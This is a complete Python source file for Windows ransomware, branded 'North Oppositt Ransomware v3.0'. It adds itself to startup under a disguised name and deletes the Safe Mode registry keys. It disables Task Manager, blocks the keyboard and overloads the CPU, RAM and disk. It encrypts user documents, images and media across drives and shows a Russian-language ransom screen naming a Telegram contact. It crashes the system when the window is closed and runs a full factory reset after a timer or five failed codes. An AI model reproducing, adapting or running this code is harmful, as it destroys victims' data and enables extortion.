import tkinter as tk
from tkinter import messagebox
import os
import sys
import winreg as reg
import threading
import keyboard
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER, c_int, windll
from cryptography.fernet import Fernet
import time
import psutil
import subprocess
import ctypes
import winsound
import hashlib
import random
import datetime

# ============================================================
# ФУНКЦИЯ ДЛЯ ВСТРАИВАНИЯ ЗВУКА
# ============================================================
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def play_music_loop():
    try:
        wav_path = resource_path("sound.wav")
        while True:
            winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
            time.sleep(60)
    except:
        pass

# ============================================================
# НАГРУЗКА НА ПК
# ============================================================
def cpu_load():
    x = 0
    while True:
        x = hashlib.sha256(str(x).encode()).hexdigest()
        for i in range(10000):
            x = x * i + i ** 2
        time.sleep(0.001)

def ram_load():
    data = []
    while True:
        try:
            data.append([random.getrandbits(512) for _ in range(10000)])
            if len(data) > 50:
                data = data[-10:]
        except:
            data = []
        time.sleep(0.1)

def disk_load():
    while True:
        try:
            temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
            for i in range(10):
                f_path = os.path.join(temp_dir, f'temp_load_{i}.tmp')
                with open(f_path, 'w') as f:
                    f.write('x' * 1000000)
                os.remove(f_path)
        except:
            pass
        time.sleep(0.5)

def start_system_load():
    for _ in range(4):
        threading.Thread(target=cpu_load, daemon=True).start()
    for _ in range(2):
        threading.Thread(target=ram_load, daemon=True).start()
    threading.Thread(target=disk_load, daemon=True).start()

# ============================================================
# ЗАПРОС ПРАВ АДМИНИСТРАТОРА
# ============================================================
def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        return False

if getattr(sys, 'frozen', False):
    run_as_admin()

# ============================================================
# ФУНКЦИИ СИСТЕМЫ
# ============================================================
def add_to_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, sys.executable)
    except:
        try:
            startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_folder, 'SystemUpdateGuard.bat')
            with open(shortcut_path, 'w') as f:
                f.write(f'start "" "{sys.executable}"')
        except:
            pass

def remove_from_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(key, "SystemUpdateGuard")
    except:
        pass
    try:
        startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
        shortcut_path = os.path.join(startup_folder, 'SystemUpdateGuard.bat')
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
    except:
        pass

def disable_safe_mode():
    try:
        os.system('reg delete "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /f')
        os.system('reg delete "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network" /f')
    except:
        pass

def restore_safe_mode():
    try:
        os.system('reg add "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /f')
        os.system('reg add "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network" /f')
    except:
        pass

def toggle_task_manager(disable=True):
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1 if disable else 0)
    except:
        pass

def enable_task_manager():
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 0)
    except:
        pass

def force_max_volume():
    from comtypes import CoInitialize
    CoInitialize()
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        while True:
            volume.SetMasterVolumeLevelScalar(1.0, None)
            threading.Event().wait(1)
    except:
        pass

def block_keyboard():
    allowed = ['0','1','2','3','4','5','6','7','8','9','backspace','enter']
    keyboard.hook(lambda e: e.name in allowed, suppress=True)

def unblock_keyboard():
    keyboard.unhook_all()

def trigger_bsod():
    try:
        ntdll = windll.ntdll
        ntdll.RtlAdjustPrivilege(19, 1, 0, c_int(0))
        ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, c_int(0))
    except:
        os.system("taskkill /f /im winlogon.exe")
    finally:
        os.system("shutdown /r /t 0 /f")

def factory_reset():
    try:
        subprocess.run("systemreset --factoryreset /clean", shell=True, capture_output=True)
        time.sleep(2)
    except:
        pass
    os.system("shutdown /r /t 1 /f")
    sys.exit()

def generate_key():
    return Fernet.generate_key()

def encrypt_files():
    key = generate_key()
    fernet = Fernet(key)
    
    try:
        reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt")
        reg.SetValueEx(reg_key, "DecryptKey", 0, reg.REG_SZ, key.decode())
    except:
        pass
    
    extensions = ('.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.png', '.zip', '.mp4', '.mp3', '.doc', '.xls', '.ppt', '.pptx')
    encrypted_count = 0
    
    for drive in ['C:\\', 'D:\\', 'E:\\']:
        if os.path.exists(drive):
            for root, dirs, files in os.walk(drive):
                skip = ['Windows', 'Program Files', 'System Volume Information', '$Recycle.Bin', 'Program Files (x86)']
                if any(s in root for s in skip):
                    continue
                for file in files:
                    if file.endswith(extensions) and not file.endswith(".north"):
                        try:
                            path = os.path.join(root, file)
                            with open(path, 'rb') as f:
                                data = f.read()
                            encrypted = fernet.encrypt(data)
                            with open(path, 'wb') as f:
                                f.write(encrypted)
                            os.rename(path, path + ".north")
                            encrypted_count += 1
                        except:
                            pass
    return encrypted_count

def decrypt_files():
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt", 0, reg.KEY_READ)
        key_str = reg.QueryValueEx(reg_key, "DecryptKey")[0]
        fernet = Fernet(key_str.encode())
        
        decrypted = 0
        for drive in ['C:\\', 'D:\\', 'E:\\']:
            if os.path.exists(drive):
                for root, dirs, files in os.walk(drive):
                    for file in files:
                        if file.endswith(".north"):
                            path = os.path.join(root, file)
                            orig_path = path[:-6]
                            try:
                                with open(path, 'rb') as f:
                                    data = f.read()
                                decrypted_data = fernet.decrypt(data)
                                with open(orig_path, 'wb') as f:
                                    f.write(decrypted_data)
                                os.remove(path)
                                decrypted += 1
                            except:
                                pass
        return decrypted
    except:
        return 0

def delete_self():
    try:
        remove_from_startup()
        try:
            reg.DeleteKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt")
        except:
            pass
        time.sleep(0.5)
        bat_path = os.path.join(os.environ['TEMP'], 'delete_self.bat')
        with open(bat_path, 'w') as f:
            f.write(f'''@echo off
timeout /t 1 /nobreak >nul
del "{sys.executable}"
del "%~f0"
''')
        os.system(f'start /min {bat_path}')
    except:
        pass
    sys.exit()

def restore_system():
    enable_task_manager()
    remove_from_startup()
    restore_safe_mode()
    unblock_keyboard()
    try:
        reg.DeleteKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt")
    except:
        pass

# ============================================================
# КАСТОМНЫЕ ОКНА
# ============================================================
def show_error_window(message, attempts_left):
    error_root = tk.Tk()
    error_root.title("ОШИБКА")
    error_root.geometry("450x250")
    error_root.resizable(False, False)
    error_root.configure(bg='#0a0a0a')
    
    error_root.update_idletasks()
    x = (error_root.winfo_screenwidth() // 2) - 225
    y = (error_root.winfo_screenheight() // 2) - 125
    error_root.geometry(f"450x250+{x}+{y}")
    
    tk.Label(error_root, text="❌ НЕВЕРНЫЙ КОД ❌", 
             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 14, "bold")).pack(pady=20)
    tk.Label(error_root, text=message, fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 11)).pack(pady=10)
    tk.Label(error_root, text=f"Осталось попыток: {attempts_left}", 
             fg="#ffaa00", bg="#0a0a0a", font=("Segoe UI", 11, "bold")).pack(pady=10)
    tk.Label(error_root, text="⚠️ При следующих неудачных попытках - ПОЛНЫЙ СБРОС", 
             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 9)).pack(pady=10)
    
    def on_ok():
        error_root.destroy()
    
    tk.Button(error_root, text="🔴 ПОНЯЛ", command=on_ok,
              bg="#333333", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(pady=15)
    error_root.protocol("WM_DELETE_WINDOW", on_ok)
    error_root.mainloop()

def show_success_window(decrypted_count):
    success_root = tk.Tk()
    success_root.title("ВОССТАНОВЛЕНИЕ")
    success_root.geometry("500x400")
    success_root.resizable(False, False)
    success_root.configure(bg='#0a0a0a')
    
    success_root.update_idletasks()
    x = (success_root.winfo_screenwidth() // 2) - 250
    y = (success_root.winfo_screenheight() // 2) - 200
    success_root.geometry(f"500x400+{x}+{y}")
    
    tk.Label(success_root, text="✅ ВОССТАНОВЛЕНИЕ УСПЕШНО ✅", 
             fg="#00ff00", bg="#0a0a0a", font=("Segoe UI", 16, "bold")).pack(pady=20)
    
    info_frame = tk.Frame(success_root, bg="#1a1a1a", bd=2, relief="solid", highlightbackground="#00ff00", highlightthickness=1)
    info_frame.pack(pady=10, padx=20, fill="both", expand=True)
    
    info_text = f"""
╔════════════════════════════════════════════════╗
║                                                ║
║   📁 Расшифровано файлов: {decrypted_count}                    ║
║                                                ║
║   🔓 Диспетчер задач: ВКЛЮЧЕН                  ║
║   🔓 Автозагрузка: ОЧИЩЕНА                     ║
║   🔓 Безопасный режим: ВОССТАНОВЛЕН            ║
║   🔓 Клавиатура: РАЗБЛОКИРОВАНА                ║
║                                                ║
║   🗑️ Винлокер УДАЛЁН С ПК                      ║
║                                                ║
║   💀 Северный Оппозит уничтожен                ║
║                                                ║
╚════════════════════════════════════════════════╝
    """
    
    tk.Label(info_frame, text=info_text, fg="#00ff00", bg="#1a1a1a", 
             font=("Consolas", 10), justify="center").pack(pady=20, padx=10)
    
    def on_exit():
        success_root.destroy()
        delete_self()
    
    tk.Button(success_root, text="🟢 ВЫЙТИ", command=on_exit,
              bg="#00ff00", fg="black", font=("Segoe UI", 11, "bold"), width=20).pack(pady=20)
    
    success_root.protocol("WM_DELETE_WINDOW", on_exit)
    success_root.mainloop()

def show_confirm_reset_window():
    confirm_root = tk.Tk()
    confirm_root.title("ПОДТВЕРЖДЕНИЕ СБРОСА")
    confirm_root.geometry("450x250")
    confirm_root.resizable(False, False)
    confirm_root.configure(bg='#0a0a0a')
    
    confirm_root.update_idletasks()
    x = (confirm_root.winfo_screenwidth() // 2) - 225
    y = (confirm_root.winfo_screenheight() // 2) - 125
    confirm_root.geometry(f"450x250+{x}+{y}")
    
    tk.Label(confirm_root, text="⚠️ ПРЕДУПРЕЖДЕНИЕ ⚠️", 
             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 14, "bold")).pack(pady=20)
    tk.Label(confirm_root, text="Вы уверены, что хотите сбросить систему?\nЭто уничтожит ВСЕ данные безвозвратно!", 
             fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 11), justify="center").pack(pady=10)
    
    result = [False]
    
    def on_confirm():
        result[0] = True
        confirm_root.destroy()
    
    def on_cancel():
        result[0] = False
        confirm_root.destroy()
    
    button_frame = tk.Frame(confirm_root, bg='#0a0a0a')
    button_frame.pack(pady=20)
    
    tk.Button(button_frame, text="💀 ДА, СБРОСИТЬ 💀", command=on_confirm,
              bg="#ff4444", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(side="left", padx=10)
    tk.Button(button_frame, text="🔵 ОТМЕНА", command=on_cancel,
              bg="#333333", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(side="left", padx=10)
    
    confirm_root.protocol("WM_DELETE_WINDOW", on_cancel)
    confirm_root.mainloop()
    return result[0]

def show_last_chance_window():
    chance_root = tk.Tk()
    chance_root.title("ПОСЛЕДНЕЕ ПРЕДУПРЕЖДЕНИЕ")
    chance_root.geometry("500x300")
    chance_root.resizable(False, False)
    chance_root.configure(bg='#0a0a0a')
    
    chance_root.update_idletasks()
    x = (chance_root.winfo_screenwidth() // 2) - 250
    y = (chance_root.winfo_screenheight() // 2) - 150
    chance_root.geometry(f"500x300+{x}+{y}")
    
    tk.Label(chance_root, text="💀 ПОСЛЕДНЯЯ ПОПЫТКА 💀", 
             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 16, "bold")).pack(pady=20)
    tk.Label(chance_root, text="Вы 5 раз ввели неверный код!\n\nЗапущен ПОЛНЫЙ СБРОС WINDOWS\nВсе ваши данные будут УНИЧТОЖЕНЫ.", 
             fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 12), justify="center").pack(pady=20)
    
    def on_ok():
        chance_root.destroy()
    
    tk.Button(chance_root, text="💀 ПОНЯЛ 💀", command=on_ok,
              bg="#ff4444", fg="white", font=("Segoe UI", 11, "bold"), width=20).pack(pady=15)
    chance_root.protocol("WM_DELETE_WINDOW", on_ok)
    chance_root.mainloop()

# ============================================================
# НАСТРОЙКИ
# ============================================================
SECRET_CODE = "192837465"
MAX_ATTEMPTS = 5
TIMER_SECONDS = 24 * 60 * 60

# ============================================================
# ТАЙМЕР 24 ЧАСА (РЕАЛЬНЫЙ СБРОС ПО ВРЕМЕНИ)
# ============================================================
def timer_loop(app):
    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=TIMER_SECONDS)
    
    while True:
        now = datetime.datetime.now()
        time_left = (end_time - now).total_seconds()
        
        if time_left <= 0:
            factory_reset()
        
        if hasattr(app, 'timer_label'):
            hours = int(time_left // 3600)
            minutes = int((time_left % 3600) // 60)
            seconds = int(time_left % 60)
            app.timer_label.config(text=f"⏰ ОСТАЛОСЬ ВРЕМЕНИ: {hours:02d}:{minutes:02d}:{seconds:02d}")
        
        time.sleep(1)

# ============================================================
# ИНТЕРФЕЙС ВИНЛОКЕРА
# ============================================================
class NorthOpposittLocker:
    def __init__(self, root):
        self.root = root
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.configure(bg='#0a0a0a')
        self.root.protocol("WM_DELETE_WINDOW", lambda: trigger_bsod())
        self.attempts = MAX_ATTEMPTS
        
        toggle_task_manager(True)
        block_keyboard()
        threading.Thread(target=force_max_volume, daemon=True).start()
        threading.Thread(target=play_music_loop, daemon=True).start()
        threading.Thread(target=self.encrypt_in_background, daemon=True).start()
        
        start_system_load()
        
        self.show_locker_screen()
        threading.Thread(target=timer_loop, args=(self,), daemon=True).start()
    
    def encrypt_in_background(self):
        self.encrypted_count = encrypt_files()
        self.update_file_count()
    
    def update_file_count(self):
        if hasattr(self, 'file_count_label'):
            self.file_count_label.config(text=f"Зашифровано файлов: {self.encrypted_count}")
    
    def show_locker_screen(self):
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both')
        
        logo_text = """
    ╔═══════════════════════════════════════╗
    ║     NORTH OPPOSITT RANSOMWARE v3.0    ║
    ╚═══════════════════════════════════════╝
        """
        logo = tk.Label(main_frame, text=logo_text, fg="#ff4444", bg="#0a0a0a", 
                        font=("Courier", 14, "bold"), justify="center")
        logo.pack(pady=20)
        
        creators = tk.Label(main_frame, text="created by iaefeel & gflm", 
                            fg="#ff4444", bg="#0a0a0a", 
                            font=("Segoe UI", 9, "bold"), justify="center")
        creators.pack(pady=(0, 10))
        
        self.timer_label = tk.Label(main_frame, text="⏰ ОСТАЛОСЬ ВРЕМЕНИ: 24:00:00", 
                                     fg="#ffaa00", bg="#0a0a0a", 
                                     font=("Segoe UI", 16, "bold"))
        self.timer_label.pack(pady=10)
        
        self.file_count_label = tk.Label(main_frame, text="Зашифровано файлов: 0", 
                                          fg="#00ff00", bg="#0a0a0a", 
                                          font=("Segoe UI", 12))
        self.file_count_label.pack(pady=5)
        
        msg = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ❌ ВСЕ ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ! ❌                     ║
║                                                              ║
║   Не пытайтесь восстановить данные самостоятельно.          ║
║   Любая попытка обхода приведёт к БЕЗВОЗВРАТНОЙ потере.     ║
║                                                              ║
║   🔐 ДЛЯ ПОЛУЧЕНИЯ КОДА РАЗБЛОКИРОВКИ:                       ║
║   📩 Напишите в Telegram: @societyvoice                      ║
║                                                              ║
║   ⚠️ ПРЕДУПРЕЖДЕНИЕ:                                        ║
║   ЧЕРЕЗ 24 ЧАСА ВСЕ ДАННЫЕ БУДУТ УНИЧТОЖЕНЫ                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        msg_label = tk.Label(main_frame, text=msg, fg="#cccccc", bg="#0a0a0a", 
                              font=("Consolas", 10), justify="center")
        msg_label.pack(pady=20)
        
        input_frame = tk.Frame(main_frame, bg='#0a0a0a')
        input_frame.pack(pady=10)
        
        tk.Label(input_frame, text="ВВЕДИТЕ КОД:", fg="white", bg="#0a0a0a", 
                 font=("Segoe UI", 12, "bold")).pack(side="left", padx=5)
        
        self.code_entry = tk.Entry(input_frame, font=("Consolas", 14), width=15, 
                                    justify='center', bg="#1a1a1a", fg="#00ff00", 
                                    insertbackground="white")
        self.code_entry.pack(side="left", padx=5)
        self.code_entry.focus_set()
        
        button_frame = tk.Frame(main_frame, bg='#0a0a0a')
        button_frame.pack(pady=20)
        
        tk.Button(button_frame, text="🔓 РАСШИФРОВАТЬ", command=self.check_code,
                  bg="#ff4444", fg="white", font=("Segoe UI", 11, "bold"), 
                  width=20, height=1).pack(side="left", padx=10)
        
        tk.Button(button_frame, text="💀 СБРОС СИСТЕМЫ", command=self.factory_reset,
                  bg="#333333", fg="white", font=("Segoe UI", 11, "bold"), 
                  width=20, height=1).pack(side="left", padx=10)
        
        def keep_focus():
            if self.code_entry.winfo_exists():
                self.code_entry.focus_force()
                self.root.after(500, keep_focus)
        keep_focus()
    
    def factory_reset(self):
        if show_confirm_reset_window():
            factory_reset()
    
    def check_code(self):
        if self.code_entry.get() == SECRET_CODE:
            decrypted = decrypt_files()
            restore_system()
            self.root.destroy()
            show_success_window(decrypted)
        else:
            self.attempts -= 1
            if self.attempts <= 0:
                show_last_chance_window()
                factory_reset()
            else:
                show_error_window(f"Вы ввели неверный код: {self.code_entry.get()}", self.attempts)

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    if getattr(sys, 'frozen', False):
        add_to_startup()
        disable_safe_mode()
    
    root = tk.Tk()
    app = NorthOpposittLocker(root)
    root.mainloop()
